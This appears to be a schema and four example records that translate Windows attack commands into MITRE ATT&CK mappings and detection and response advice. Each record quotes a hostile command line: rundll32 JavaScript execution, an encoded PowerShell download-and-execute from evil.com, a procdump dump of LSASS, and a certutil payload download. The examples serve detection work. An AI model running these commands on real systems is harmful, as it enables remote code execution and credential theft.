### Single Translation Object
translation_output = {
    "input_command": str,
    "offensive_interpretation": {
        "summary": str,
        "intent": str,
        "common_usage": str
    },
    "mitre_mapping": [
        {
            "tactic": str,
            "technique_id": str,
            "technique_name": str
        }
    ],
    "defensive_enrichment": {
        "detection_sources": list[str],
        "suspicious_indicators": list[str],
        "recommended_actions": list[str]
    }
}
---------------------------------------------------------------------

### Example 1 — Living-off-the-land via rundll32
{
  "input_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
  "offensive_interpretation": {
    "summary": "Executes JavaScript through rundll32 to proxy code execution via a trusted Windows binary.",
    "intent": "Defense evasion and execution without dropping a payload",
    "common_usage": "Fileless malware and initial execution"
  },
  "mitre_mapping": [
    {
      "tactic": "Execution",
      "technique_id": "T1059.007",
      "technique_name": "Command and Scripting Interpreter: JavaScript"
    },
    {
      "tactic": "Defense Evasion",
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32"
    }
  ],
  "defensive_enrichment": {
    "detection_sources": [
      "Sysmon Event ID 1 (Process Creation)",
      "Windows Security Event ID 4688"
    ],
    "suspicious_indicators": [
      "rundll32.exe executing JavaScript",
      "Presence of mshtml.dll in command line"
    ],
    "recommended_actions": [
      "Inspect parent process",
      "Check for network connections following execution",
      "Hunt for similar rundll32 patterns across endpoints"
    ]
  }
}

### Example 2 — Encoded PowerShell execution
{
  "input_command": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtACcAKQA=",
  "offensive_interpretation": {
    "summary": "Runs an encoded PowerShell payload that downloads and executes remote content.",
    "intent": "Payload delivery and execution",
    "common_usage": "Malware loaders and post-exploitation"
  },
  "mitre_mapping": [
    {
      "tactic": "Execution",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell"
    },
    {
      "tactic": "Defense Evasion",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information"
    }
  ],
  "defensive_enrichment": {
    "detection_sources": [
      "PowerShell Operational Logs (Event ID 4104)",
      "Sysmon Event ID 1",
      "AMSI logs"
    ],
    "suspicious_indicators": [
      "Use of -EncodedCommand",
      "Base64-encoded payload",
      "Network download via WebClient"
    ],
    "recommended_actions": [
      "Decode and analyze the payload",
      "Block the remote URL/domain",
      "Review PowerShell usage on the host"
    ]
  }
}

### Example 3 — Credential dumping via LSASS access
{
  "input_command": "procdump.exe -ma lsass.exe lsass.dmp",
  "offensive_interpretation": {
    "summary": "Creates a memory dump of LSASS to extract credentials.",
    "intent": "Credential access",
    "common_usage": "Post-exploitation credential dumping"
  },
  "mitre_mapping": [
    {
      "tactic": "Credential Access",
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory"
    }
  ],
  "defensive_enrichment": {
    "detection_sources": [
      "Sysmon Event ID 10 (Process Access)",
      "Windows Defender Credential Guard alerts"
    ],
    "suspicious_indicators": [
      "Access to lsass.exe",
      "Creation of memory dump files"
    ],
    "recommended_actions": [
      "Isolate the host immediately",
      "Invalidate potentially compromised credentials",
      "Verify if Credential Guard is enabled"
    ]
  }
}

### Example 4 — Suspicious LOLBin network activity via certutil
{
  "input_command": "certutil.exe -urlcache -split -f http://malicious.site/payload.exe payload.exe",
  "offensive_interpretation": {
    "summary": "Downloads a remote payload using certutil to evade application controls.",
    "intent": "Payload delivery",
    "common_usage": "Living-off-the-land download technique"
  },
  "mitre_mapping": [
    {
      "tactic": "Command and Control",
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer"
    },
    {
      "tactic": "Defense Evasion",
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution"
    }
  ],
  "defensive_enrichment": {
    "detection_sources": [
      "Sysmon Event ID 3 (Network Connection)",
      "Proxy or firewall logs"
    ],
    "suspicious_indicators": [
      "certutil making outbound HTTP requests",
      "Executable file written to disk"
    ],
    "recommended_actions": [
      "Block certutil outbound traffic where possible",
      "Quarantine the downloaded file",
      "Search for certutil usage across the environment"
    ]
  }
}


